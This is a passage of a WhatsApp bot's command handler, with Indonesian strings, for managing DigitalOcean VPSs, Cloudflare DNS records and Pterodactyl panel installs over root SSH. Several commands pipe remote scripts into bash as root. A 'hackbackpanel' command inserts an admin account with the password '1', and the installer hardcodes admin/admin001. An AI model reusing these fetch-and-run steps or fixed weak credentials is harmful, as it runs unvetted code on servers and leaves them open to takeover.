                    return syahreply(`❌ Gagal melakukan restart VPS:\n🌟 *Akun DigitalOcean V${version}*\n${restartData.message || "Terjadi kesalahan"}`);
                }

                return syahreply(`✅ *Aksi restart VPS berhasil dimulai!*\n\n📡 *Droplet ID:* ${dropletId}\n🌟 *Akun DigitalOcean V${version}*\n🔄 *Status:* ${restartData.action.status}\n> Tunggu 1 menit ke depan untuk mengakses VPS kembali`);
            }
        } catch (err) {
            console.error(`Error di akun V${version}:`, err);
            errors.push(`❌ Akun DigitalOcean V${version}: Gagal menghubungi API`);
        }
    }

    if (!found) {
        let errorMessage = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di akun mana pun.\n`;
        if (errors.length > 0) {
            errorMessage += `\n${errors.join("\n")}`;
        }
        return syahreply(errorMessage);
    }
}
break;     
        
case "startvps":
case "stopvps": { 
    if (!isCreator) return syahreply(mess.owner);
    if (!text) return syahreply(example("IDDroplet"));

    let dropletId = text.trim();
    let found = false;
    let errors = [];
    let actionType = command === "startvps" ? "power_on" : "power_off";
    let actionLabel = command === "startvps" ? "start" : "stop";

    for (const [key, apiKey] of Object.entries(global.apiDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            let response = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!response.ok) {
                errors.push(`❌ Akun DigitalOcean V${version}: API key tidak valid`);
                continue;
            }

            let data = await response.json();
            let matchedDroplet = data.droplets.find(d => d.id.toString() === dropletId);

            if (matchedDroplet) {
                found = true;

                let actionResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    },
                    body: JSON.stringify({ type: actionType })
                });

                let actionData = await actionResponse.json();

                if (!actionResponse.ok) {
                    return syahreply(`❌ Gagal melakukan ${actionLabel} VPS:\n🌟 *Akun DigitalOcean V${version}*\n${actionData.message || "Terjadi kesalahan"}`);
                }

                return syahreply(
                    `✅ *Aksi ${actionLabel} VPS berhasil dimulai!*\n\n` +
                    `📡 *Droplet ID:* ${dropletId}\n` +
                    `🌟 *Akun DigitalOcean V${version}*\n` +
                    `🔄 *Status:* ${actionData.action.status}\n` +
                    `> Tunggu beberapa saat hingga VPS sepenuhnya ${actionLabel === "start" ? "menyala" : "mati"}`
                );
            }
        } catch (err) {
            console.error(`Error di akun V${version}:`, err);
            errors.push(`❌ Akun DigitalOcean V${version}: Gagal menghubungi API`);
        }
    }

    if (!found) {
        let errorMessage = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di akun mana pun.\n`;
        if (errors.length > 0) {
            errorMessage += `\n${errors.join("\n")}`;
        }
        return syahreply(errorMessage);
    }
}
break;
        
case "subdomain": 
case "subdo": {
    if (!isCreator) return syahreply(`${mess.owner} 𝗦𝗨𝗕𝗗𝗢𝗠𝗔𝗜𝗡!`);
    if (!text || !text.includes("|")) return syahreply(example("host|ipserver"));

    let [host, ip] = text.split("|").map(i => i.trim());
    let dom = Object.keys(global.subdomain);

    if (dom.length === 0) return syahreply("❌ Tidak ada domain yang tersedia saat ini.");

    let list = dom.map((i, index) => ({
        header: `(${index + 1}) ${i}`,
        title: `Create Domain ${host}.${i}`,
        id: `${prefix}create_domain ${index + 1} ${host}|${ip}`
    }));

    await syah.sendMessage(m.chat, {
        buttons: [{
            buttonId: 'action',
            buttonText: { displayText: 'Pilih Domain' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: '𝗣𝗜𝗟𝗜𝗛 𝗗𝗢𝗠𝗔𝗜𝗡',
                    sections: [{
                        title: '# List Domain Yang Tersedia',
                        highlight_label: ``,
                        rows: list
                    }]
                })
            }
        }],
        footer: `*${botname}*`,
        headerType: 1,
        viewOnce: true,
        text: "🔹 *Pilih Domain Yang Tersedia:*",
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
        }
    }, { quoted: m });
}
break;        
case "cekwings": {
  if (!isCreator) return syahreply(mess.owner);
  if (!text || !text.includes("|")) return syahreply(`*Format Salah!*\n\nContoh:\n.cekwings 123.456.78.90|password`);

  const [ip, password] = text.split("|").map(x => x.trim());
  const conn = new Client();

  syahreply("🕵️ Mengecek status *Wings* di VPS...");

  conn.on("ready", () => {
    conn.exec("systemctl is-active wings", (err, stream) => {
      if (err) {
        console.error("SSH EXEC ERROR:", err);
        conn.end();
        return syahreply(`❌ Gagal menjalankan pengecekan Wings.`);
      }

      let output = "";
      stream.on("data", (data) => output += data.toString());
      stream.stderr.on("data", (data) => output += data.toString());

      stream.on("close", () => {
        conn.end();
        const status = output.trim();
        let pesan;

        if (status === "active") {
          pesan = "✅ *Wings Sedang Aktif*\n\n🟢 Service berjalan dengan baik di VPS.";
        } else if (status === "inactive") {
          pesan = "🛑 *Wings Tidak Aktif*\n\n🔌 Service dalam kondisi mati.";
        } else {
          pesan = `❓ *Status Tidak Dikenal*\n\n🔍 Output: ${status}`;
        }

        syahreply(`📡 *Hasil Pengecekan Wings:*\n\n🌐 IP: ${ip}\n🛠️ Status: ${status.toUpperCase()}\n\n${pesan}`);
      });
    });
  }).on("error", (err) => {
    console.error("SSH CONNECTION ERROR:", err);
    syahreply(`❌ Tidak dapat terhubung ke VPS! Pastikan IP dan password benar.`);
  }).connect({
    host: ip,
    port: 22,
    username: "root",
    password: password
  });
}
break;
case "ubahnegara": {
  if (!isCreator) return syahreply(mess.owner);

  if (!text || !text.includes("|")) {
    return syahreply(`*Format Salah!*\n\nContoh:\n.ubahnegara 123456789|sgp1\n\n*Format:* IDVPS|KODE_REGION\n\n🗺️ *Kode Region DigitalOcean:*\n- sgp1 = Singapore\n- sfo3 = San Francisco\n- nyc3 = New York\n- fra1 = Frankfurt\n- lon1 = London\n- ams3 = Amsterdam`);
  }

  const axios = require("axios");
  const apiKey = global.apiDigitalOcean; // Ambil API key dari global
  const [dropletIdRaw, regionRaw] = text.split("|");
  const dropletId = dropletIdRaw.trim();
  const region = regionRaw.trim();

  try {
    await syahreply("📡 Mengambil data VPS lama...");

    // Ambil data VPS lama
    const res = await axios.get(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
      headers: { Authorization: `Bearer ${apiKey}` }
    });

    const oldDroplet = res?.data?.droplet;
    if (!oldDroplet) throw new Error("Data VPS tidak ditemukan.");

    const oldName = oldDroplet.name;
    const imageSlug = oldDroplet.image?.slug;
    const sizeSlug = oldDroplet.size?.slug;
    const sshKeys = (oldDroplet.ssh_keys || []).map(k => k.id);

    if (!imageSlug || !sizeSlug) throw new Error("Data image atau size tidak lengkap.");

    // Hapus VPS lama
    await syahreply(`🧨 Menghapus VPS lama (ID: ${dropletId})...`);
    await axios.delete(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
      headers: { Authorization: `Bearer ${apiKey}` }
    });

    // Buat ulang VPS di region baru
    await syahreply(`🛠️ Membuat ulang VPS di *${region}*...`);
    const create = await axios.post(`https://api.digitalocean.com/v2/droplets`, {
      name: oldName,
      region: region,
      size: sizeSlug,
      image: imageSlug,
      ssh_keys: sshKeys,
      backups: false,
      ipv6: true,
      tags: ["recreated"]
    }, {
      headers: {
        Authorization: `Bearer ${apiKey}`,
        "Content-Type": "application/json"
      }
    });

    const newDroplet = create?.data?.droplet;
    if (!newDroplet) throw new Error("Gagal membuat VPS baru.");

    const newId = newDroplet.id;
    const newRegion = newDroplet.region?.slug || region;

    await syahreply(`✅ *VPS Berhasil Dipindah!*\n\n🌐 *Lokasi Baru:* ${newRegion}\n🆔 *ID VPS Baru:* ${newId}\n📛 *Nama:* ${oldName}\n🧠 *Ukuran:* ${sizeSlug}`);
  } catch (err) {
    const errorMsg = err?.response?.data?.message || err?.message || "Terjadi kesalahan tak terduga.";
    console.error("❌ ERROR:", err?.response?.data || err);
    return syahreply(`❌ *Gagal mengubah negara VPS!*\n\n📛 Error: ${errorMsg}\n\nPastikan:\n• ID VPS valid\n• Region tersedia\n• API key benar`);
  }
}
break;
case "create_domain": {
    if (!isCreator) return syahreply(mess.owner);
    if (!args[0] || isNaN(args[0])) return syahreply("Domain tidak ditemukan!");
    
    const dom = Object.keys(global.subdomain);
    const domainIndex = Number(args[0]) - 1;
    
    if (domainIndex < 0 || domainIndex >= dom.length) return syahreply("Domain tidak ditemukan!");
    if (!args[1] || !args[1].includes("|")) return syahreply("Hostname/IP tidak ditemukan!");
    
    const tldnya = dom[domainIndex];
    const [host, ip] = args[1].split("|").map(item => item.trim());
    
    async function createSubDomain(host, ip) {
        try {
            const response = await axios.post(
                `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
                {
                    type: "A",
                    name: `${host.replace(/[^a-z0-9.-]/gi, "")}.${tldnya}`,
                    content: ip.replace(/[^0-9.]/gi, ""),
                    ttl: 3600,
                    priority: 10,
                    proxied: false
                },
                {
                    headers: {
                        Authorization: `Bearer ${global.subdomain[tldnya].apitoken}`,
                        "Content-Type": "application/json"
                    }
                }
            );

            const res = response.data;
            if (res.success) {
                return {
                    success: true,
                    zone: res.result?.zone_name || "Tidak diketahui",
                    name: res.result?.name || "Tidak diketahui",
                    ip: res.result?.content || ip
                };
            } else {
                return { success: false, error: "Gagal membuat subdomain" };
            }
        } catch (e) {
            const errorMsg = e.response?.data?.errors?.[0]?.message || e.message || "Terjadi kesalahan";
            return { success: false, error: errorMsg };
        }
    }

    const result = await createSubDomain(host.toLowerCase(), ip);
    
    if (result.success) {
        let teks = `✅ *Berhasil membuat subdomain*\n\n🌐 *Subdomain:* ${result.name}\n📌 *IP Server:* ${result.ip}`;
        await syahreply(teks);
        await syahreply(result.name);
    } else {
        await syahreply(`❌ Gagal membuat subdomain:\n${result.error}`);
    }
}
break;        
case 'installtema': {
    if (!isCreator) return syahreply(mess.owner)
    let t = text.split('|');
    if (t.length < 2) return syahreply(`❌ *Format salah!* Penggunaan: ${prefix + command} ipvps|password`);

    let ipvps = t[0];
    let passwd = t[1];

    await syah.sendMessage(m.chat, { 
        footer: `© 2025 WYII 🚀`, 
        buttons: [ 
            { 
                buttonId: 'action', 
                buttonText: { displayText: '⚙️ Pilih Tema' }, 
                type: 4, 
                nativeFlowInfo: { 
                    name: 'single_select', 
                    paramsJson: JSON.stringify({ 
                        title: '🎨 Pilih Install Thema Lain', 
                        sections: [ 
                            { 
                                title: '📜 List Install Thema', 
                                rows: [ 
                                    { title: '🛠 INSTALLDEPEND', description: '⚡ Install Thema Depend', id: `.installdepend ${ipvps}|${passwd}` }, 
                                    { title: '🌟 INSTALLSTELLAR', description: '✨ Install Thema Stellar', id: `.installtemastellar ${ipvps}|${passwd}` },
                                    { title: '🚀INSTALLTEMANOOKTHEME', description: '✨ Install Thema Nooktheme', id: `.installtemanooktheme ${ipvps}|${passwd}` },
                                    { title: '💰 INSTALLBILLING', description: '💵 Install Thema Billing', id: `.installtemabilling ${ipvps}|${passwd}` }, 
                                    { title: '🌀 INSTALLENIGMA', description: '🔮 Install Thema Enigma', id: `.installtemaenigma ${ipvps}|${passwd}` },
                                    { title: '🎶 INSTALLNIGHTCORE', description: '🌙 Install Thema Night Core', id: `.installtemanightcore ${ipvps}|${passwd}` },
                                    { title: '🌌 INSTALLNEBULA', description: '🌠 Install Thema Nebula', id: `.installtemanebula ${ipvps}|${passwd}` },
                                    { title: '🏛 INSTALLELYSIUM', description: '⚔️ Install Thema Elysium', id: `.installtemaelysium ${ipvps}|${passwd}` }
                                ] 
                            } 
                        ] 
                    }) 
                } 
            } 
        ], 
        headerType: 1, 
        viewOnce: true, 
        image: { url: global.image.reply }, 
        caption: "🎨 *Silakan pilih tema yang ingin di-install dari 7 versi di bawah ini!* 🚀\n" 
    }, { quoted: qtext });

} 
break;
case "delsubdo": {
    if (!isCreator) return syahreply(mess.owner);

    if (!args[0]) return syahreply(example(`Subdomainnya\n\nContoh:\n*${cmd}* panel.example.com\n> Note: Hanya bisa menghapus subdomain yang domainnya ada pada global.subdomain`));

    let recordName = args[0].toLowerCase();
    const dom = Object.keys(global.subdomain);

    async function listDNSRecords(tldnya) {
        let records = [];
        let page = 1;

        while (true) {
            try {
                const res = await axios.get(
                    `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records?page=${page}`,
                    {
                        headers: {
                            Authorization: `Bearer ${global.subdomain[tldnya].apitoken}`,
                            "Content-Type": "application/json"
                        }
                    }
                );

                if (res.data.success) {
                    records.push(...res.data.result);

                    if (res.data.result_info.page < res.data.result_info.total_pages) {
                        page++;
                    } else {
                        return { success: true, records };
                    }
                } else {
                    return { success: false, error: "Gagal mengambil data DNS records." };
                }
            } catch (err) {
                return { success: false, error: err.response?.data?.errors?.[0]?.message || err.message || "Terjadi kesalahan." };
            }
        }
    }

    async function deleteDNSRecord(tldnya, recordId) {
        try {
            const res = await axios.delete(
                `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records/${recordId}`,
                {
                    headers: {
                        Authorization: `Bearer ${global.subdomain[tldnya].apitoken}`,
                        "Content-Type": "application/json"
                    }
                }
            );

            if (res.data.success) {
                return { success: true };
            } else {
                return { success: false, error: "Gagal menghapus DNS record." };
            }
        } catch (err) {
            return { success: false, error: err.response?.data?.errors?.[0]?.message || err.message || "Terjadi kesalahan." };
        }
    }

    let recordFound = false;

    for (let tldnya of dom) {
        let recordsResponse = await listDNSRecords(tldnya);

        if (recordsResponse.success) {
            let record = recordsResponse.records.find((r) => r.name.toLowerCase() === recordName);

            if (record) {
                recordFound = true;
                let deleteResponse = await deleteDNSRecord(tldnya, record.id);

                if (deleteResponse.success) {
                    return syahreply(`✅ *Berhasil menghapus DNS record*\n\n📌 *Type:* ${record.type}\n🌐 *Name:* ${record.name}\n🔗 *Alamat IP:* ${record.content}`);
                } else {
                    return syahreply(`❌ Gagal menghapus DNS record: ${deleteResponse.error}`);
                }
            }
        }

        if (recordFound) break;
    }

    if (!recordFound) {
        return syahreply(`⚠️ DNS record dengan nama *${recordName}* tidak ditemukan.`);
    }
}
break;        

case "delallsubdo": {
    if (!isCreator) return syahreply(mess.owner);
    if (!args[0]) {
        let dom = Object.keys(global.subdomain);
        if (dom.length === 0) return syahreply("❌ Tidak ada domain yang tersedia saat ini.");

        let list = dom.map((i, index) => ({
            header: `(${index + 1}) ${i}`,
            title: `Hapus Semua DNS Record Dari Domain ${i}`,
            id: `${prefix}delallsubdo ${i}`
        }));

        return syah.sendMessage(m.chat, {
            buttons: [{
                buttonId: 'action',
                buttonText: { displayText: 'Pilih Domain' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝗣𝗜𝗟𝗜𝗛 𝗗𝗢𝗠𝗔𝗜𝗡',
                        sections: [{
                            title: '# Silahkan Pilih Salah Satu Domain Di Bawah',
                            highlight_label: ``,
                            rows: list
                        }]
                    })
                }
            }],
            footer: `*${botname}*`,
            headerType: 1,
            viewOnce: true,
            text: "Silahkan Pilih Domain Yang Ingin Dihapus Semua DNS Recordnya",
            contextInfo: {
                isForwarded: true, 
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
            }
        }, { quoted: m });
    }

    const domain = args[0].toLowerCase();
    const tldnya = Object.keys(global.subdomain).find((key) => key.toLowerCase() === domain);

    if (!tldnya) return syahreply(`Domain *${domain}* tidak ditemukan!`);

    async function listAllDNSRecords(tldnya) {
        let allRecords = [];
        let page = 1;

        while (true) {
            try {
                const res = await axios.get(
                    `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
                    {
                        headers: {
                            Authorization: `Bearer ${global.subdomain[tldnya].apitoken}`,
                            "Content-Type": "application/json",
                        },
                        params: { page, per_page: 50 },
                    }
                );

                if (res.data.success) {
                    allRecords.push(...res.data.result);
                    if (res.data.result_info.page >= res.data.result_info.total_pages) break;
                    page++;
                } else {
                    return { success: false, error: "Gagal mengambil data DNS records." };
                }
            } catch (err) {
                return { success: false, error: err.response?.data?.errors?.[0]?.message || err.message || "Terjadi kesalahan." };
            }
        }

        return { success: true, records: allRecords };
    }

    async function deleteDNSRecord(tldnya, recordId) {
        try {
            const res = await axios.delete(
                `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records/${recordId}`,
                {
                    headers: {
                        Authorization: `Bearer ${global.subdomain[tldnya].apitoken}`,
                        "Content-Type": "application/json",
                    },
                }
            );

            return res.data.success ? { success: true } : { success: false, error: "Gagal menghapus DNS record." };
        } catch (err) {
            return { success: false, error: err.response?.data?.errors?.[0]?.message || err.message || "Terjadi kesalahan." };
        }
    }

    const dnsRecords = await listAllDNSRecords(tldnya);
    if (!dnsRecords.success) return syahreply(`Gagal mengambil daftar DNS records untuk domain *${domain}*.\n${dnsRecords.error}`);
    if (dnsRecords.records.length === 0) return syahreply(`Tidak ada DNS records yang ditemukan untuk domain *${domain}*.`);

    let successCount = 0;
    let failCount = 0;
    let failDetails = [];

    await syahreply(`⏳ Sedang memproses penghapusan seluruh DNS records dari domain *${domain}*\n\nHarap tunggu beberapa menit, ini mungkin memakan waktu.`);

    for (let record of dnsRecords.records) {
        let delRes = await deleteDNSRecord(tldnya, record.id);
        if (delRes.success) {
            successCount++;
        } else {
            failCount++;
            failDetails.push({ name: record.name, error: delRes.error });
        }

        await new Promise(resolve => setTimeout(resolve, 500)); // Jeda 500ms untuk menghindari rate limit
    }

    let teks = `*Hasil Penghapusan DNS Records*\n\n`;
    teks += `*Domain:* ${domain}\n`;
    teks += `*Berhasil Dihapus:* ${successCount}\n`;
    teks += `*Gagal Dihapus:* ${failCount}\n`;

    if (failCount > 0) {
        teks += `\n*Detail Kegagalan:*\n`;
        failDetails.forEach((fail, idx) => {
            teks += `${idx + 1}. *Name:* ${fail.name}\n   *Error:* ${fail.error}\n`;
        });
    }

    return syahreply(teks);
}
break;        
        
case "listdns": {
    if (!isCreator) return syahreply(mess.owner);
    let dom = Object.keys(global.subdomain);

    if (dom.length === 0) return syahreply("❌ Tidak ada domain yang tersedia saat ini.");

    let list = dom.map((i, index) => ({
        header: `(${index + 1}) ${i}`,
        title: `Lihat List DNS Record ${i}`,
        id: `${prefix}res_list_dns_record ${i}`
    }));

    await syah.sendMessage(m.chat, {
        buttons: [{
            buttonId: 'action',
            buttonText: { displayText: 'Pilih Domain' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: '𝗣𝗜𝗟𝗜𝗛 𝗗𝗢𝗠𝗔𝗜𝗡',
                    sections: [{
                        title: '# Silahkan Pilih Salah Satu Domain Di Bawah',
                        highlight_label: ``,
                        rows: list
                    }]
                })
            }
        }],
        footer: `*${botname}*`,
        headerType: 1,
        viewOnce: true,
        text: "Pilih Domain Yang Ingin Dilihat List DNS Recordnya",
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
        }
    }, { quoted: m });
}
break;
        
case "res_list_dns_record": {
    if (!isCreator) return syahreply(mess.owner);
    if (!args[0]) return;
    
    const subdomain = args[0].toLowerCase();
    const page = args[1] ? parseInt(args[1]) : 1;
    const perPage = 100;

    if (!global.subdomain[subdomain]) 
        return syahreply(`❌ Subdomain *${subdomain}* tidak ditemukan!`);

    async function listDNSRecords(subdomain, page) {
        try {
            const res = await axios.get(
                `https://api.cloudflare.com/client/v4/zones/${global.subdomain[subdomain].zone}/dns_records`,
                {
                    headers: {
                        Authorization: `Bearer ${global.subdomain[subdomain].apitoken}`,
                        "Content-Type": "application/json",
                    },
                    params: { per_page: perPage, page: page },
                }
            );

            if (res.data.success) {
                const records = res.data.result.map((record) => ({
                    id: record.id,
                    type: record.type,
                    name: record.name,
                    content: record.content,
                    proxied: record.proxied,
                    created_on: record.created_on,
                    modified_on: record.modified_on,
                }));

                return {
                    success: true,
                    records,
                    totalRecords: res.data.result_info.total_count || 0,
                    totalPages: res.data.result_info.total_pages || 1,
                };
            } else {
                return { success: false, error: "Gagal mengambil data DNS records." };
            }
        } catch (err) {
            return { 
                success: false, 
                error: err.response?.data?.errors?.[0]?.message || err.message || "Terjadi kesalahan." 
            };
        }
    }

    function formatDateWithDay(dateString) {
        const date = new Date(dateString);
        const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
        const day = days[date.getDay()];
        const datePart = date.toLocaleDateString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric' });
        const timePart = date.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
        return `${day}, ${datePart} Pukul ${timePart}`;
    }

    const dnsRecords = await listDNSRecords(subdomain, page);
    if (!dnsRecords.success) return syahreply(`❌ ${dnsRecords.error}`);
    if (dnsRecords.records.length === 0) 
        return syahreply(`⚠ Tidak ada DNS records untuk domain *${subdomain}*.`);

    let teks = `📌 *Daftar DNS Records untuk domain:* *${subdomain}*\n`;
    teks += `━━━━━━━━━━━━━━━━━━━━━━\n`;

    let list = [];

    dnsRecords.records.forEach((record, index) => {
        teks += `🔹 *${index + 1 + (page - 1) * perPage}.*\n`;
        teks += `   ➜ *Nama:* ${record.name}\n`;
        teks += `   ➜ *Tipe:* ${record.type}\n`;
        teks += `   ➜ *Tujuan:* ${record.content}\n`;
        teks += `   ➜ *Proxy:* ${record.proxied ? "✔ Diaktifkan" : "❌ Tidak aktif"}\n`;
        teks += `   ➜ *Dibuat:* ${formatDateWithDay(record.created_on)}\n`;
        teks += `   ➜ *Diubah:* ${formatDateWithDay(record.modified_on)}\n`;
        teks += `━━━━━━━━━━━━━━━━━━━━━━\n`;

        list.push({
            title: `🗑 Hapus: ${record.name} (${record.type})`,
            description: `Alamat IP: ${record.content}`,
            id: `${prefix}delsubdo ${record.name}`
        });
    });

    teks += `📌 *Halaman:* ${page}/${dnsRecords.totalPages}\n`;
    teks += `📌 *Total DNS Records:* ${dnsRecords.totalRecords}\n`;

    await syah.sendMessage(m.chat, {
        buttons: [{ buttonId: `${prefix}res_del_all_dns_records ${subdomain}`, buttonText: { displayText: '🗑 Hapus Semua DNS Records' }, type: 1 },
            {
                buttonId: "action",
                buttonText: { displayText: "🛠️ Pilih DNS Record" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({
                        title: "HAPUS DNS RECORD",
                        sections: [{ title: "# Silahkan Pilih Record Yang Ingin Dihapus", rows: [...list] }]
                    })
                }
            }
        ],
        footer: `*${botname}*`,
        headerType: 1,
        viewOnce: true,
        text: teks,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
        },
    }, { quoted: qfake });

    let buttons = [];

    if (dnsRecords.totalPages > 1) {
        if (page > 1) {
            buttons.push({
                buttonId: `${cmd} ${subdomain} ${page - 1}`,
                buttonText: { displayText: `⬅️ Halaman ${page - 1}` },
                type: 1
            });
        }
        if (page < dnsRecords.totalPages) {
            buttons.push({
                buttonId: `${cmd} ${subdomain} ${page + 1}`,
                buttonText: { displayText: `➡️ Halaman ${page + 1}` },
                type: 1
            });
        }

        await sleep(2000);
        await syah.sendMessage(m.chat, {
            buttons,
            footer: `*${botname}*`,
            headerType: 1,
            viewOnce: true,
            text: "Klik tombol di bawah untuk melihat halaman lain",
            contextInfo: {
                isForwarded: true,
                mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
            },
        }, { quoted: m });
    }
}
break;
        
case "hbpanel": case "hackbackpanel": {
    if (!isCreator) return syahreply(mess.owner);
    
    let t = text.split('|');
    if (t.length < 2) return syahreply(example("ipvps|pwvps"));

    await syah.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    let ipvps = t[0];
    let passwd = t[1];

    const newuser = "wyii"
    const newpw = "1"

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {    
                let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`;
                await syahreply(teks);
                ress.end();
            }).on('data', async (data) => {
                await console.log(data.toString());
            }).stderr.on('data', (data) => {
                stream.write("7\n");
                stream.write(`${newuser}\n`);
                stream.write(`${newpw}\n`);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        syahreply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break;
  
case "installpanel": {
if (!isCreator) return syahreply(mess.owner);
if (!text) return syahreply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"));

let vii = text.split("|");
if (vii.length < 5) return syahreply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"));

const ress = new Client();
const connSettings = {
  host: vii[0].trim(),
  port: 22,
  username: "root",
  password: vii[1].trim()
};

const randomValue1 = getRandom("");
const randomValue2 = getRandom("");
const user = "admin" 
const pass = "admin001" 
const domainpanel = vii[2].trim();
const domainnode = vii[3].trim();
const ramserver = vii[4].trim();
const deletemysql = `\n`;
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`;

// ======================= INSTALL WINGS =======================

async function instalWings() {
  try {
    console.log("🚀 [WINGS] Menjalankan installer wings...");

    ress.exec(commandPanel, (err, stream) => {
      if (err) return syahreply(`❌ ${err.message}`);

      stream.setEncoding("utf8");

      stream.on("data", (data) => {
        const out = data.toString();
        process.stdout.write("🟡 [WINGS] " + out);

        if (out.includes("Input 0-6")) stream.write("1\n");
        if (out.includes("(y/N)")) stream.write("y\n");
        if (out.includes("Enter the panel address")) stream.write(`${domainpanel}\n`);
        if (out.includes("Database host username")) stream.write(`${user}\n`);
        if (out.includes("Database host password")) stream.write(`${pass}\n`);
        if (out.includes("node.example.com")) stream.write(`${domainnode}\n`);
        if (out.includes("Enter email")) stream.write("admin@gmail.com\n");
      });

      stream.stderr.on("data", (d) => {
        process.stdout.write("🔴 [WINGS-ERR] " + d.toString());
      });

      stream.on("close", () => {
        console.log("✅ [WINGS] Install selesai, lanjut create node...");

        ress.exec(`bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/main/createnode.sh)`, (err2, stream2) => {
          if (err2) return syahreply(`❌ ${err2.message}`);

          stream2.setEncoding("utf8");

          stream2.on("data", (chunk) => {
            const out = chunk.toString();
            process.stdout.write("🟢 [CREATENODE] " + out);

            if (out.includes("Masukkan nama lokasi")) stream2.write("Singapore\n");
            if (out.includes("Masukkan deskripsi lokasi")) stream2.write("Node By AstralMarket\n");
            if (out.includes("Masukkan domain")) stream2.write(`${domainnode}\n`);
            if (out.includes("Masukkan nama node")) stream2.write("SG\n");
            if (out.includes("Masukkan RAM")) stream2.write(`${ramserver}\n`);
            if (out.includes("disk space")) stream2.write(`${ramserver}\n`);
            if (out.includes("Masukkan Locid")) stream2.write("1\n");
          });

          stream2.stderr.on("data", (d) => {
            process.stdout.write("🔴 [CREATENODE-ERR] " + d.toString());
          });

          stream2.on("close", () => {
            console.log("✅ [CREATENODE] Selesai, generate config.yml...");

            const cmdCfg = `cd /var/www/pterodactyl && php artisan p:node:configuration 1 > /etc/pterodactyl/config.yml && chmod 600 /etc/pterodactyl/config.yml && systemctl restart wings`;

            ress.exec(cmdCfg, async (err3) => {
              if (err3) return syahreply(`❌ ${err3.message}`);

              console.log("✅ [WINGS] config.yml sukses & wings direstart");

              let teks = `*📦 Berikut Detail Akun Admin Panel:*

*Username:* ${user}
*Password:* ${pass}
*Domain:* ${domainpanel}

Ketik:
${prefix}startwings ipvps|pwvps|tokenwings`;

              await syah.sendMessage(m.chat, { text: teks }, { quoted: m });
            });
          });
        });
      });
    });
  } catch (e) {
    syahreply(e.message);
  }
}

// ======================= INSTALL PANEL =======================

async function instalPanel() {
  try {
    console.log("🚀 [PANEL] Menjalankan installer panel...");

    ress.exec(commandPanel, (err, stream) => {
      if (err) return syahreply(`❌ ${err.message}`);

      stream.setEncoding("utf8");

      stream.on("data", (data) => {
        const out = data.toString();
        process.stdout.write("🟡 [PANEL] " + out);

        if (out.includes("Input 0-6")) stream.write("0\n");
        if (out.includes("(y/N)")) stream.write("y\n");
        if (out.includes("Database name")) stream.write(`${user}\n`);
        if (out.includes("Database username")) stream.write(`${user}\n`);
        if (out.includes("Password")) stream.write(`${pass}\n`);
        if (out.includes("Select timezone")) stream.write("Asia/Jakarta\n");
        if (out.includes("Provide the email")) stream.write("admin@gmail.com\n");
        if (out.includes("Email address for the initial admin")) stream.write("admin@gmail.com\n");
        if (out.includes("Username for the initial admin")) stream.write(`${user}\n`);
        if (out.includes("First name")) stream.write("wyi\n");
        if (out.includes("Last name")) stream.write("wyi\n");
        if (out.includes("Set the FQDN")) stream.write(`${domainpanel}\n`);
        if (out.includes("UFW")) stream.write("y\n");
        if (out.includes("HTTPS")) stream.write("y\n");
        if (out.includes("Select the appropriate number")) stream.write("1\n");
        if (out.includes("I agree")) stream.write("y\n");
        if (out.includes("Proceed anyways")) stream.write("y\n");
        if (out.includes("(yes/no)")) stream.write("yes\n");
        if (out.includes("Initial configuration completed")) stream.write("y\n");
        if (out.includes("Still assume SSL")) stream.write("y\n");
        if (out.includes("Terms of Service")) stream.write("y\n");
        if (out.includes("(A)gree")) stream.write("A\n");
      });

      stream.stderr.on("data", (d) => {
        process.stdout.write("🔴 [PANEL-ERR] " + d.toString());
      });

      stream.on("close", () => {
